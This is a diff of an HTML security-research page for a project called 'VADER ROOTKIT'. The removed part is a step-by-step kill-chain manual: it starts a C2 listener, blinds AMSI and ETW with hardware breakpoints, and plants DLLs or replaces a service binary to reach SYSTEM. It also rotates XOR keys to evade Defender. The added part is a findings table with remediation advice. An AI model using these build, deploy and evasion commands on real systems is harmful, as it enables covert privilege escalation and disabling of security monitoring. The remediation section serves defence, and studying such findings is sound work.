-  <hr>
-
-  <!-- ── PART 4 ── -->
-  <h1 class="part-header" id="learn-part4">Part 4: Operational Architecture</h1>
-  <div class="part-doctrine">ASF Principle 1+2 combined: understand the whole system, see every path and every block.</div>
-
-  <!-- Chapter 10 -->
-  <h2 id="learn-ch10">Chapter 10: The Complete Kill Chain</h2>
-
-  <h3>Current State</h3>
-
-<pre><code>BUILT:
-  Phase 0: C2 shell (vader_shell)           +
-  Phase 1: AMSI bypass (HWBP)               +
-  Phase 2: ETW bypass (HWBP)                +
-  Phase 1+2: Dark room (combined)           +
-  Phase 3: Privilege escalation (7 vectors) +
-  Recon: Target scanning                    +
-  Detection: Automated scan (scan_all.py)   +
-  Deployment: Automated (deploy.py)         +
-
-NOT BUILT:
-  Phase 4: Process injection                &lt;- This manual teaches it
-  Phase 5: Stagers/droppers                 &lt;- Next after Phase 4
-  Auto-mutation pipeline                    &lt;- This manual teaches it</code></pre>
-
-  <h3>How It All Connects</h3>
-
-<pre><code>+-------------------------------------------------------------+
-|                    OPERATOR MACHINE                          |
-|                                                              |
-|  deploy.py --> scan_all.py (verify evasion)                  |
-|      |                                                       |
-|      +---> vader_recon.ps1 (identify targets)                |
-|      |                                                       |
-|      +---> dark_room.exe (blind AMSI+ETW)                    |
-|      |         |                                             |
-|      |         +---> vader_inject.exe (propagate blind)      |  &lt;- Phase 4
-|      |                   |                                   |
-|      |                   +---> Target process is BLIND       |
-|      |                                                       |
-|      +---> osppc.dll / svc_replace.exe (privesc)             |
-|      |         |                                             |
-|      |         +---> SYSTEM-level execution                  |
-|      |                                                       |
-|      +---> vader_listener.py &lt;-- vader_shell (callback)     |
-|                                                              |
-|  mutate.py --> Rotate XOR keys when detected                 |  &lt;- Mutation pipeline
-|      |                                                       |
-|      +---> scan_all.py (verify new evasion)                  |
-+-------------------------------------------------------------+</code></pre>
-
-  <h3>The Ideal Chain (Once Everything Is Built)</h3>
-
-<pre><code>1. Run mutate.py on all components      -> Ensure evasion against current sigs
-2. Run scan_all.py                      -> Verify all CLEAN
-3. Run deploy.py --recon                -> Identify targets on machine
-4. Run deploy.py --chain V7             -> Execute: dark room + privesc + shell
-5. vader_inject targets powershell.exe  -> Propagate AMSI/ETW bypass
-6. Operate from SYSTEM shell            -> Full control, invisible to Defender</code></pre>
-
-  <h3>What Makes This "Complete"</h3>
-
-  <p>A toolkit is complete when it can:</p>
-  <ol>
-    <li><strong>Evade</strong> &mdash; All components pass AV scan (<code>scan_all.py</code> confirms)</li>
-    <li><strong>Escalate</strong> &mdash; Standard user achieves SYSTEM (canary proves it)</li>
-    <li><strong>Persist</strong> &mdash; Survives reboot (service-based vectors auto-restart)</li>
-    <li><strong>Communicate</strong> &mdash; Operator receives shell callback (<code>vader_shell</code>)</li>
-    <li><strong>Propagate</strong> &mdash; Bypass extends to new processes (Phase 4 injection)</li>
-    <li><strong>Adapt</strong> &mdash; When detected, mutation restores evasion (<code>mutate.py</code>)</li>
-  </ol>
-
-  <p>You have 1-4 built. This manual teaches 5 and 6.</p>
-
-  <hr>
-
-  <!-- Exercises Index -->
-  <h2 id="learn-exercises">Exercises Index</h2>
 
   <table>
     <thead>
       <tr>
-        <th>Exercise</th>
-        <th>Chapter</th>
-        <th>Topic</th>
-        <th>Difficulty</th>
+        <th>Defense Layer</th>
+        <th>Status</th>
+        <th>Finding</th>
+        <th>Notes</th>
       </tr>
     </thead>
     <tbody>
-      <tr><td>1.1</td><td>Ch 1</td><td>Identify encoded vs plaintext strings</td><td>Beginner</td></tr>
-      <tr><td>1.2</td><td>Ch 1</td><td>Empirical key rotation test</td><td>Beginner</td></tr>
-      <tr><td>3.1</td><td>Ch 3</td><td>Manual <a class="xref" href="#learn-ch3">XOR</a> key rotation</td><td>Beginner</td></tr>
-      <tr><td>3.2</td><td>Ch 3</td><td>Build a batch encoder script</td><td>Beginner</td></tr>
-      <tr><td>4.1</td><td>Ch 4</td><td>Apply all 5 mutation techniques</td><td>Intermediate</td></tr>
-      <tr><td>5.1</td><td>Ch 5</td><td>Parse <a class="xref" href="#learn-ch3">XOR</a> arrays from C source</td><td>Intermediate</td></tr>
-      <tr><td>5.2</td><td>Ch 5</td><td>Decode and re-encode arrays</td><td>Intermediate</td></tr>
-      <tr><td>5.3</td><td>Ch 5</td><td>Compile from Python</td><td>Intermediate</td></tr>
-      <tr><td>5.4</td><td>Ch 5</td><td>Scan from Python</td><td>Intermediate</td></tr>
-      <tr><td>5.5</td><td>Ch 5</td><td>Complete <a class="xref" href="#learn-ch5">mutation pipeline</a></td><td>Advanced</td></tr>
-      <tr><td>7.1</td><td>Ch 7</td><td><a class="xref" href="#learn-ch7">DR7</a> bit calculations</td><td>Intermediate</td></tr>
-      <tr><td>7.2</td><td>Ch 7</td><td>Read dark_room.c analysis</td><td>Beginner</td></tr>
-      <tr><td>8.1</td><td>Ch 8</td><td>Windows API research</td><td>Beginner</td></tr>
-      <tr><td>8.2</td><td>Ch 8</td><td>Thread enumeration pseudocode</td><td>Intermediate</td></tr>
-      <tr><td>9.1</td><td>Ch 9</td><td>Design injection DLL</td><td>Advanced</td></tr>
-      <tr><td>9.2</td><td>Ch 9</td><td>Design injector program</td><td>Advanced</td></tr>
-      <tr><td>9.3</td><td>Ch 9</td><td>New thread problem analysis</td><td>Advanced</td></tr>
+      <tr>
+        <td>AMSI (Script Scanning)</td>
+        <td><span class="badge badge-red">BYPASSED</span></td>
+        <td>#33</td>
+        <td>Hardware breakpoint on AmsiScanBuffer &mdash; zero memory modification</td>
+      </tr>
+      <tr>
+        <td>ETW (Process Telemetry)</td>
+        <td><span class="badge badge-red">BYPASSED</span></td>
+        <td>#35</td>
+        <td>Hardware breakpoint on EtwEventWrite &mdash; events silently discarded</td>
+      </tr>
+      <tr>
+        <td>Defender Static Analysis</td>
+        <td><span class="badge badge-red">DEFEATED</span></td>
+        <td>#32</td>
+        <td>Single-byte XOR (0x41) defeats string-based static signatures</td>
+      </tr>
+      <tr>
+        <td>Defender Behavioral</td>
+        <td><span class="badge badge-red">DEFEATED</span></td>
+        <td>#33</td>
+        <td>AMSI_Patch_T fires on VirtualProtect pattern; HWBP avoids it entirely</td>
+      </tr>
+      <tr>
+        <td>Service ACL</td>
+        <td><span class="badge badge-red">BROKEN</span></td>
+        <td>#42</td>
+        <td><code>BUILTIN\Users Full Control</code> on SYSTEM service binary &amp; directory</td>
+      </tr>
+      <tr>
+        <td>Manifest Hardening</td>
+        <td><span class="badge badge-amber">BYPASSED</span></td>
+        <td>#40, #42</td>
+        <td>DLL sideload blocked by manifest; entire binary replaced instead</td>
+      </tr>
+      <tr>
+        <td>UAC</td>
+        <td><span class="badge badge-amber">NOT TRIGGERED</span></td>
+        <td>#42</td>
+        <td>Write target is AppData, not a UAC-protected path</td>
+      </tr>
+      <tr>
+        <td>Defender Cloud/ML</td>
+        <td><span class="badge badge-amber">PARTIAL</span></td>
+        <td>#39</td>
+        <td>Retroactive detection after ~15 min; pre-planted files persist unscanned</td>
+      </tr>
     </tbody>
   </table>
-
-  <p><strong>Recommended path:</strong></p>
-  <ul>
-    <li>Week 1: Exercises 1.1 &rarr; 3.2 (understanding + manual XOR work)</li>
-    <li>Week 2: Exercises 5.1 &rarr; 5.5 (build the <a class="xref" href="#learn-ch5">mutation pipeline</a>)</li>
-    <li>Week 3: Exercises 7.1 &rarr; 8.2 (understand injection fundamentals)</li>
-    <li>Week 4: Exercises 9.1 &rarr; 9.3 (design the injector)</li>
-  </ul>
-
-  <hr>
-
-  <!-- Reading List -->
-  <h2 id="learn-reading">Reading List</h2>
-
-  <h3>Books</h3>
-  <ul>
-    <li><strong>Windows Internals, Part 1 &amp; 2</strong> (Russinovich, Solomon, Ionescu) &mdash; The bible. How Windows actually works.</li>
-    <li><strong>The Art of Exploitation</strong> (Jon Erickson) &mdash; Fundamentals of exploitation.</li>
-    <li><strong>Practical Malware Analysis</strong> (Sikorski, Honig) &mdash; Reverse engineering malware. Teaches you to READ what others write.</li>
-  </ul>
-
-  <h3>Online Resources</h3>
-  <ul>
-    <li><strong>MITRE ATT&amp;CK T1055</strong> &mdash; <a class="xref" href="#learn-ch8">Process Injection</a> technique documentation (sub-techniques map to the techniques in Chapter 8)</li>
-    <li><strong>Intel Software Developer Manual, Vol 3, Chapter 17</strong> &mdash; <a class="xref" href="#learn-ch7">Debug registers</a>. The primary source.</li>
-    <li><strong>Microsoft Docs: Debugging Functions</strong> &mdash; <code>GetThreadContext</code>, <code>SetThreadContext</code>, etc.</li>
-  </ul>
-
-  <h3>Research Papers</h3>
-  <ul>
-    <li>Endgame (now Elastic): "Ten <a class="xref" href="#learn-ch8">Process Injection</a> Techniques" &mdash; Survey of injection methods</li>
-    <li>Itzik Kotler: "<a class="xref" href="#learn-ch8">Process Injection</a> Techniques &mdash; Gotta Catch Them All" &mdash; DEF CON talk</li>
-  </ul>
-
-  <h3>Courses</h3>
-  <ul>
-    <li>SANS SEC760: Advanced Exploit Development</li>
-    <li>Sektor7: Malware Development Essentials / Intermediate</li>
-    <li>OffSec OSCE3 (OSED module covers shellcode + process manipulation)</li>
-  </ul>
-
-  <p style="color:var(--dim); font-size:0.78rem; margin-top:2rem; font-style:italic;">VADER ROOTKIT &mdash; 22DIV / george wu &mdash; CSEC Tactical Cyber Operations &mdash; "Search for knowledge, not for 0-days." &mdash; 0x1security</p>
-
-
-  <!-- ══════════════════════════════════════════════════════════════════ -->
-  <!--                                                                    -->
-  <!--                  EXECUTION MANUAL — FULL CONTENT                   -->
-  <!--                                                                    -->
-  <!-- ══════════════════════════════════════════════════════════════════ -->
-
-  <hr class="content-divider">
-
-  <h1 class="part-header" style="margin-top:1rem;">EXECUTION MANUAL</h1>
-  <p style="color:var(--muted); font-size:0.82rem;">Step-by-Step Kill Chain Walkthrough</p>
-
-  <p>This is the step-by-step execution guide. Not theory. Not history. You follow this from top to bottom and you get a working <a class="xref" href="#learn-ch10">kill chain</a> on your own machine.</p>
-
-  <p>The OPERATIONS_MANUAL.md is the vector-by-vector reference. This document is the "do this, then this, then this" walkthrough that ties them together.</p>
-
-  <hr>
-
-  <!-- Section 1: Pre-Flight -->
-  <h2 id="exec-preflight">1. Pre-Flight Checklist</h2>
-
-  <p>Run every check before you start. If any fails, fix it before proceeding.</p>
-
-  <h3>1.1 Compiler Available</h3>
-
-<pre><code>call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
-cl.exe 2>&amp;1 | findstr "Version"</code></pre>
-
-  <p><strong>Expected:</strong> Prints MSVC version string.<br>
-  <strong>If missing:</strong> Install Visual Studio 18 Community with "Desktop development with C++" workload.</p>
-
-  <h3>1.2 Python Available</h3>
-
-<pre><code>python --version</code></pre>
-
-  <p><strong>Expected:</strong> Python 3.x.<br>
-  <strong>If missing:</strong> Install from python.org, add to PATH.</p>
-
-  <h3>1.3 Defender Running</h3>
-
-<pre><code>sc query WinDefend</code></pre>
-
-  <p><strong>Expected:</strong> <code>STATE: 4 RUNNING</code><br>
-  <strong>If not running:</strong> We fight the live system. If <a class="xref" href="#learn-ch1">Defender</a> isn't running, the test proves nothing. Enable it: Windows Security &gt; Virus &amp; threat protection &gt; Real-time protection ON.</p>
-
-  <h3>1.4 User Context</h3>
-
-<pre><code>whoami
-whoami /groups | findstr "S-1-5-32-544"</code></pre>
-
-  <p><strong>Expected:</strong> Your username, and the findstr returns NOTHING (you are NOT in the Administrators group).<br>
-  <strong>Why:</strong> The entire privesc chain assumes standard user. If you're already admin, the escalation is meaningless.</p>
-
-  <h3>1.5 Detection Status</h3>
-
-<pre><code>python tests\scan_all.py</code></pre>
-
-  <p><strong>Expected:</strong> All binaries CLEAN.<br>
-  <strong>If ANY show DETECTED:</strong> Stop. Do not proceed. See <a class="xref" href="#exec-troubleshoot">Troubleshooting: Component Detected</a>.</p>
-
-  <hr>
-
-  <!-- Section 2: Quick Start -->
-  <h2 id="exec-quickstart">2. Quick Start (deploy.py)</h2>
-
-  <p>The <a class="xref" href="#exec-quickstart"><code>deploy.py</code></a> script automates the <a class="xref" href="#learn-ch10">kill chain</a>. Use it when you know what you're doing and want speed.</p>
-
-<pre><code>:: Check what's available
-python deploy.py --help
-
-:: Recon only (identify targets on this machine)
-python deploy.py --recon
-
-:: Check all binaries against current Defender
-python deploy.py --status
-
-:: Deploy V7 GOLF (phantom DLL -- recommended first vector)
-python deploy.py --deploy V7
-
-:: Full chain: status check + dark room + V7 + shell setup
-python deploy.py --chain V7
-
-:: Start C2 listener on port 4444
-python deploy.py --listen
-
-:: Start C2 listener on custom port
-python deploy.py --listen 9999
-
-:: Check if a vector fired (look for canary file)
-python deploy.py --canary V7</code></pre>
-
-  <h3>deploy.py Decision Tree</h3>
-
-<pre><code>Want to know what's vulnerable?    -> --recon
-Want to check evasion status?      -> --status
-Want to deploy one vector?         -> --deploy V7
-Want the full automated chain?     -> --chain V7
-Want to catch the callback?        -> --listen
-Want to verify a vector fired?     -> --canary V7</code></pre>
-
-  <hr>
-
-  <!-- Section 3: Manual Execution -->
-  <h2 id="exec-killchain">3. Manual Execution: Full Kill Chain</h2>
-
-  <p>When you want to understand every step. Follow in order.</p>
-
-<pre><code>KILL CHAIN FLOW:
-  [Recon] -> [Scan] -> [Build] -> [C2 Listener] -> [Dark Room] -> [Privesc] -> [Verify]</code></pre>
-
-  <h3>Recon</h3>
-
-  <p>Run the recon script on the target machine first. This identifies what's available.</p>
-
-<pre><code>powershell -ep bypass .\recon\vader_recon.ps1</code></pre>
-
-  <p>This reports:</p>
-  <ul>
-    <li>Writable service binaries (V4 DELTA targets)</li>
-    <li>User-writable PATH directories (V6/V7 targets)</li>
-    <li>DLL import gaps (V5/V7 targets)</li>
-    <li><a class="xref" href="#learn-ch1">Defender</a> version and configuration</li>
-    <li>Service manifest presence (V5 blockers)</li>
-  </ul>
-
-  <p>Read the output. It tells you which vectors are viable on this specific machine.</p>
-
-  <h3>Phase 0: C2 Listener</h3>
-
-  <p>Start the listener FIRST. It needs to be waiting when the privesc payload calls back.</p>
-
-<pre><code>:: Option A: Python listener (recommended)
-python shell\vader_listener.py 4444
-
-:: Option B: ncat fallback
-ncat -lvp 4444</code></pre>
-
-  <p><strong>Expected:</strong> Listener reports waiting on port 4444.<br>
-  <strong>Leave this running.</strong> Open a second terminal for the rest.</p>
-
-  <h3>Phase 1+2: Dark Room (<a class="xref" href="#learn-ch6">AMSI+ETW</a> Bypass)</h3>
-
-  <p>The <a class="xref" href="#learn-ch6">dark room</a> blinds both <a class="xref" href="#learn-ch6">AMSI</a> (script scanning) and <a class="xref" href="#learn-ch6">ETW</a> (telemetry) simultaneously using <a class="xref" href="#learn-ch7">hardware breakpoints</a>. Zero memory modification.</p>
-
-  <h4>Build</h4>
-
-<pre><code>call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
-cl.exe dark_room\dark_room_annotated.c /Fe:dark_room.exe /O1 /GS-</code></pre>
-
-  <p><strong>Expected:</strong> <code>dark_room.exe</code> appears in repo root. No warnings required.</p>
-
-  <h4>Test (verify bypass works without deploying)</h4>
-
-<pre><code>dark_room.exe --test</code></pre>
-
-  <p><strong>Expected output:</strong></p>
-
-<pre><code>[*] VADER DARK ROOM -- AMSI + ETW Hardware Breakpoint Bypass
-[+] AmsiScanBuffer: 0x00007FFxxxxxxxx
-[+] EtwEventWrite:  0x00007FFxxxxxxxx
-[+] VEH installed
-[+] DR0 set -> AmsiScanBuffer
-[+] DR1 set -> EtwEventWrite
-[+] AMSI: BLIND
-[+] ETW: BLIND</code></pre>
-
-  <p><strong>If <code>AMSI: BLIND</code> does not appear:</strong> See <a class="xref" href="#exec-troubleshoot">Troubleshooting: Dark Room Fails</a>.</p>
-
-  <h4>Deploy (activate bypass + spawn shell)</h4>
-
-<pre><code>dark_room.exe</code></pre>
-
-  <p>This sets the <a class="xref" href="#learn-ch7">hardware breakpoints</a> and spawns a new PowerShell session. Inside that PowerShell, <a class="xref" href="#learn-ch6">AMSI</a> and <a class="xref" href="#learn-ch6">ETW</a> are blind. Any scripts you run will not be scanned or reported.</p>
-
-  <p><strong>Test it inside the spawned PowerShell:</strong></p>
-
-<pre><code># This string normally triggers Defender:
-"Invoke-Mimikatz"
-# If AMSI is blind, no alert. If AMSI is active, Defender blocks it.</code></pre>
-
-  <h4>Critical Limitation</h4>
-
-  <p><a class="xref" href="#learn-ch7">Hardware breakpoints</a> are <strong>per-process</strong>. The spawned PowerShell inherits the blind state, but any NEW process you launch from it (e.g., <code>Start-Process</code>) does NOT. This is why Phase 4 (<a class="xref" href="#learn-ch8">injection</a>) exists &mdash; to propagate the breakpoints into other processes.</p>
-
-  <h3>Phase 3: Privilege Escalation</h3>
-
-  <p>Choose your vector based on recon results.</p>
-
-  <h4>Decision Tree: Which Vector?</h4>
-
-<pre><code>Is Microsoft Office installed?
-+-- YES -> V7 GOLF (phantom DLL)          &lt;- RECOMMENDED. First-party. Auto-trigger.
-|         Office ClickToRunSvc loads osppc.dll from PATH.
-|         osppc.dll doesn't exist. You fill the void.
-|
-+-- NO  -> Is Wondershare installed?
-          +-- YES -> V4 DELTA (service replace)
-          |         NativePushService has insecure ACLs.
-          |         Replace the binary. Wait for restart.
-          |
-          +-- NO  -> V6 FOXTROT (generic PATH plant)
-                    Requires recon to find a DLL gap.
-                    Run vader_recon.ps1 and check output.</code></pre>
-
-  <h4>V7 GOLF &mdash; Phantom DLL (Recommended)</h4>
-
-  <p><strong>Why V7:</strong> First-party Microsoft service. Always running. Auto-restarts daily. User-writable PATH directory. No admin required at any step.</p>
-
-  <p><strong>Build:</strong></p>
-
-<pre><code>cl.exe vectors\v7_phantom_dll\phantom_dll_annotated.c /Fe:osppc.dll /LD /O1 /GS- /utf-8</code></pre>
-
-  <p><strong>Expected:</strong> <code>osppc.dll</code> appears. This is your payload DLL.</p>
-
-  <p><strong>Deploy:</strong></p>
-
-<pre><code>:: Create the target directory if it doesn't exist
-mkdir "%USERPROFILE%\.local\bin" 2>nul
-
-:: Plant the DLL
-copy osppc.dll "%USERPROFILE%\.local\bin\osppc.dll"
-
-:: Verify it's in place
-dir "%USERPROFILE%\.local\bin\osppc.dll"</code></pre>
-
-  <p><strong>Trigger (pick one):</strong></p>
-
-<pre><code>:: Option A: Force trigger (immediate)
-schtasks /Run /TN "\Microsoft\Office\Office Automatic Updates 2.0"
-
-:: Option B: Launch any Office app (Word, Excel, etc.)
-:: Option C: Wait -- ClickToRunSvc restarts daily</code></pre>
-
-  <p><strong>Verify:</strong></p>
-
-<pre><code>type C:\Windows\Temp\osp_telemetry.log</code></pre>
-
-  <p><strong>Expected output:</strong></p>
-
-<pre><code>2026-06-17T10:30:00|SYSTEM|elev=1|pid=1234|PHANTOM_OSPPC|C:\Program Files\...\OfficeClickToRun.exe</code></pre>
-
-  <p>If you see <code>SYSTEM</code> and <code>elev=1</code> &mdash; you have SYSTEM-level code execution from a standard user account.</p>
-
-  <h4>V4 DELTA &mdash; Service Binary Replacement</h4>
-
-  <p><strong>Prerequisites:</strong> Wondershare NativePushService installed with insecure ACLs (check with recon).</p>
-
-  <p><strong>Build:</strong></p>
-
-<pre><code>cl.exe vectors\v4_svc_replace\svc_replace_annotated.c /Fe:WsNativePushService.exe /O1 /GS- /utf-8 /link advapi32.lib user32.lib</code></pre>
-
-  <p><strong>Deploy:</strong></p>
-
-<pre><code>:: Step 1: Rename the real binary (Windows allows renaming running executables)
-ren "C:\Users\%USERNAME%\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe" WsNativePushService_real.exe
-
-:: Step 2: Plant the replacement
-copy WsNativePushService.exe "C:\Users\%USERNAME%\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe"</code></pre>
-
-  <p><strong>Trigger:</strong></p>
-
-<pre><code>:: Reboot triggers the service restart
-shutdown /r /t 60
-:: Or wait for the service to restart on its own</code></pre>
-
-  <p><strong>Verify after reboot:</strong></p>
-
-<pre><code>type C:\Windows\Temp\svc_health.log</code></pre>
-
-  <p><strong>Expected:</strong> <code>SYSTEM|elev=1|pid=XXXX|DELTA_REPLACE</code></p>
-
-  <h4>V6 FOXTROT &mdash; Generic PATH Plant</h4>
-
-  <p>V6 is the fallback. It requires a DLL gap found by recon &mdash; there's no universal target like V7's <code>osppc.dll</code>.</p>
-
-<pre><code>:: Build with the target DLL name from recon
-cl.exe vectors\v6_path_hijack\path_hijack_dll_annotated.c /Fe:TARGET_NAME.dll /LD /O1 /GS- /utf-8
-
-:: Deploy
-copy TARGET_NAME.dll "%USERPROFILE%\.local\bin\"</code></pre>
-
-  <p><strong>Trigger:</strong> Whatever causes the target service to load that DLL (reboot, service restart, etc.).</p>
-
-  <p><strong>Verify:</strong></p>
-
-<pre><code>type C:\Windows\Temp\hwmon_diag.log</code></pre>
-
-  <h3>Phase 4: Process Injection (NOT BUILT)</h3>
-
-  <p>This phase does not exist yet. See <a class="xref" href="#learn-ch6">Learning Manual Chapter 6</a> for the concepts and guided build instructions.</p>
-
-  <p><strong>What it would do:</strong> Inject the <a class="xref" href="#learn-ch6">dark room's</a> <a class="xref" href="#learn-ch7">HWBP</a> setup into a target process (e.g., PowerShell) so that process also has <a class="xref" href="#learn-ch6">AMSI/ETW</a> bypass.</p>
-
-  <p><strong>Why it matters:</strong> Without injection, the <a class="xref" href="#learn-ch6">dark room</a> only works in its own process. Child processes don't inherit <a class="xref" href="#learn-ch7">hardware breakpoints</a>.</p>
-
-  <hr>
-
-  <!-- Section 4: Verification -->
-  <h2 id="exec-verify">4. Verification Checklist</h2>
-
-  <p>After running the <a class="xref" href="#learn-ch10">kill chain</a>, verify each phase succeeded:</p>
-
-<pre><code>[ ] Pre-flight: All binaries CLEAN (scan_all.py)
-[ ] Dark room: --test shows AMSI: BLIND and ETW: BLIND
-[ ] Privesc: Canary file exists and contains SYSTEM + elev=1
-[ ] C2 (if using shell): Listener received callback
-[ ] Evidence: Screenshots, canary contents, whoami /all saved</code></pre>
-
-  <h3>Evidence Collection</h3>
-
-  <p>For every successful run, collect:</p>
-
-<pre><code>:: 1. Canary content
-type C:\Windows\Temp\&lt;canary_file&gt;.log > evidence\canary_%date%.txt
-
-:: 2. Privilege confirmation (from SYSTEM context if shell achieved)
-whoami /all > evidence\whoami_%date%.txt
-
-:: 3. Process context
-tasklist /v /fi "pid eq &lt;canary_pid&gt;" > evidence\process_%date%.txt
-
-:: 4. Screenshot of services.msc showing the hijacked service
-:: (manual -- use Snipping Tool or Win+Shift+S)</code></pre>
-
-  <hr>
-
-  <!-- Section 5: Troubleshooting -->
-  <h2 id="exec-troubleshoot">5. Troubleshooting</h2>
-
-  <h3>Component Detected</h3>
-
-  <p><strong>Symptom:</strong> <code>scan_all.py</code> reports a binary as DETECTED.<br>
-  <strong>Cause:</strong> <a class="xref" href="#learn-ch1">Defender</a> updated its <a class="xref" href="#learn-ch2">signatures</a> and now recognises the binary.<br>
-  <strong>Fix:</strong></p>
-  <ol>
-    <li>Identify which binary was caught</li>
-    <li>Check the vector &mdash; what <a class="xref" href="#learn-ch3">XOR</a> key does it use? (see OPERATIONS_MANUAL.md &rarr; Vector Index)</li>
-    <li>Generate new <a class="xref" href="#learn-ch3">XOR</a>-encoded strings with a different key:
-<pre><code>key = 0xAA  # new key -- pick any byte except 0x00
-s = "your string here"
-print(", ".join(f"0x{b ^ key:02X}" for b in s.encode()))</code></pre>
-    </li>
-    <li>Replace the encoded arrays in the source file</li>
-    <li>Update the <a class="xref" href="#learn-ch3">XOR</a> key constant in the source</li>
-    <li>Recompile</li>
-    <li>Re-scan: <code>python tests\scan_all.py</code></li>
-    <li>If STILL detected &rarr; deeper mutation needed (variable names, function order, code flow). See <a class="xref" href="#learn-ch4">Learning Manual Chapter 4</a>.</li>
+</section>
+
+<!-- ════════════ SECTION 7: REMEDIATION ════════════ -->
+<section id="remediation">
+  <div class="section-header">
+    <div class="section-number">Section 07</div>
+    <h2 class="section-title">Remediation Recommendations</h2>
+  </div>
+
+  <ol class="remediation-list">
+    <li><strong>Restrictive ACLs on all SYSTEM service directories and binaries.</strong> Service executables and their parent directories should be writable only by <code>SYSTEM</code> and <code>BUILTIN\Administrators</code>. No user-writable SYSTEM services.</li>
+    <li><strong>Service binaries must not reside in per-user AppData paths.</strong> <code>%ProgramFiles%</code> or <code>%SystemRoot%</code> enforce proper ACL inheritance by default. AppData directories inherit permissive user ACLs.</li>
+    <li><strong>Digital signature verification on service binaries at SCM level.</strong> The Service Control Manager should optionally verify Authenticode signatures before loading service executables, similar to driver signature enforcement.</li>
+    <li><strong>Behavioral rules for SetThreadContext targeting security DLLs.</strong> Defender should detect <code>SetThreadContext</code> calls that set debug registers (DR0&ndash;DR3) to addresses within <code>amsi.dll</code>, <code>ntdll.dll</code>, or other security-critical modules.</li>
+    <li><strong>Hardware breakpoint monitoring via EtwTiLogSetContextThread.</strong> The kernel ETW-Ti provider already exposes <code>EtwTiLogSetContextThread</code>. Defender (or a dedicated consumer) should subscribe to this event and alert when debug registers target security function addresses.</li>
+  </ol>
+</section>
+
+<!-- ════════════ SECTION 8: FINDINGS SUMMARY ════════════ -->
+<section id="findings">
+  <div class="section-header">
+    <div class="section-number">Section 08</div>
+    <h2 class="section-title">Key Findings Summary</h2>
+  </div>
+
+  <div class="prose" style="margin-bottom: 1.5rem;">
+    <p>23 findings from the rootkit phase (Engagements 7&ndash;14). Continues from 30 prior findings in the vader-toctou campaign.</p>
+  </div>
+
+  <table>
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Title</th>
+        <th>Module</th>
+        <th>Status</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>31</td>
+        <td>Defender behavioral detection of classic AMSI patch (VirtualProtect + memcpy)</td>
+        <td>amsi/</td>
+        <td><span class="badge badge-red">DETECTED</span></td>
+      </tr>
+      <tr>
+        <td>32</td>
+        <td>XOR static evasion confirmed &mdash; single-byte XOR defeats Defender static engine</td>
+        <td>amsi/</td>
+        <td><span class="badge badge-green">CONFIRMED</span></td>
+      </tr>
+      <tr>
+        <td>33</td>
+        <td>Hardware breakpoint AMSI bypass evades Defender completely</td>
+        <td>amsi/</td>
+        <td><span class="badge badge-green">CONFIRMED</span></td>
+      </tr>
+      <tr>
+        <td>34</td>
+        <td>Classic ETW patch detected by Defender ML heuristic (Bearfoos.B!ml)</td>
+        <td>etw/</td>
+        <td><span class="badge badge-red">DETECTED</span></td>
+      </tr>
+      <tr>
+        <td>35</td>
+        <td>Hardware breakpoint ETW bypass evades Defender &mdash; dead man test confirmed</td>
+        <td>etw/</td>
+        <td><span class="badge badge-green">CONFIRMED</span></td>
+      </tr>
+      <tr>
+        <td>36</td>
+        <td>Defender tamper protection blind spot: CPU debug registers (systemic pattern)</td>
+        <td>cross-module</td>
+        <td><span class="badge badge-amber">MSRC POTENTIAL</span></td>
+      </tr>
+      <tr>
+        <td>37</td>
+        <td>Combined dark room verified &mdash; AMSI + ETW dual HWBP, all user-mode telemetry blind</td>
+        <td>dark_room/</td>
+        <td><span class="badge badge-green">CONFIRMED</span></td>
+      </tr>
+      <tr>
+        <td>38</td>
+        <td>Wondershare NativePushService &mdash; LocalSystem DLL sideload vector identified</td>
+        <td>sideload/</td>
+        <td><span class="badge badge-green">CONFIRMED</span></td>
+      </tr>
+      <tr>
+        <td>39</td>
+        <td>Defender cloud/ML retroactive detection of DLL proxy pattern (~15 min delay)</td>
+        <td>sideload/</td>
+        <td><span class="badge badge-red">DETECTED</span></td>
+      </tr>
+      <tr>
+        <td>40</td>
+        <td>Wondershare manifest-based DLL redirection hardening blocks sideload</td>
+        <td>sideload/</td>
+        <td><span class="badge badge-amber">BLOCKED</span></td>
+      </tr>
+      <tr>
+        <td>41</td>
+        <td>Defender ML proxy pattern signature &mdash; XOR + lazy-init evades (v6 clean)</td>
+        <td>sideload/</td>
+        <td><span class="badge badge-green">EVADED</span></td>
+      </tr>
+      <tr>
+        <td>42</td>
+        <td><strong>Privilege escalation via service binary replacement (CWE-732) &mdash; SYSTEM</strong></td>
+        <td>sideload/</td>
+        <td><span class="badge badge-green">SYSTEM</span></td>
+      </tr>
+      <tr>
+        <td>43</td>
+        <td>VADER shell bolt-on &mdash; SYSTEM reverse shell via service replacement</td>
+        <td>sideload/</td>
+        <td><span class="badge badge-cyan">BUILT</span></td>
+      </tr>
+      <tr>
+        <td>44</td>
+        <td>Automated target reconnaissance package (20-section, PE parser, phantom DLL hunting, auto-scored vector assessment)</td>
+        <td>recon/</td>
+        <td><span class="badge badge-cyan">BUILT</span></td>
+      </tr>
+      <tr>
+        <td>45</td>
+        <td><strong>User-owned directories in machine SYSTEM PATH (CWE-427) &mdash; PATH hijack</strong></td>
+        <td>recon/</td>
+        <td><span class="badge badge-amber">MSRC POTENTIAL</span></td>
+      </tr>
+      <tr>
+        <td>46</td>
+        <td>Steam directory ACLs allow standard user write &mdash; service binary secure (CLOSED)</td>
+        <td>recon/</td>
+        <td><span class="badge badge-amber">CLOSED</span></td>
+      </tr>
+      <tr>
+        <td>47</td>
+        <td><strong>Phantom DLL PATH hijack: ClickToRunSvc / osppc.dll (CWE-427) &mdash; first-party Microsoft</strong></td>
+        <td>recon/</td>
+        <td><span class="badge badge-amber">MSRC POTENTIAL</span></td>
+      </tr>
+      <tr>
+        <td>48</td>
+        <td>Steam service DLL import analysis &mdash; all imports resolve to KnownDLLs/System32 (negative)</td>
+        <td>recon/</td>
+        <td><span class="badge badge-cyan">AUDIT</span></td>
+      </tr>
+      <tr>
+        <td>49</td>
+        <td>Comprehensive service binary ACL audit &mdash; 47 services, only Wondershare vulnerable</td>
+        <td>recon/</td>
+        <td><span class="badge badge-cyan">AUDIT</span></td>
+      </tr>
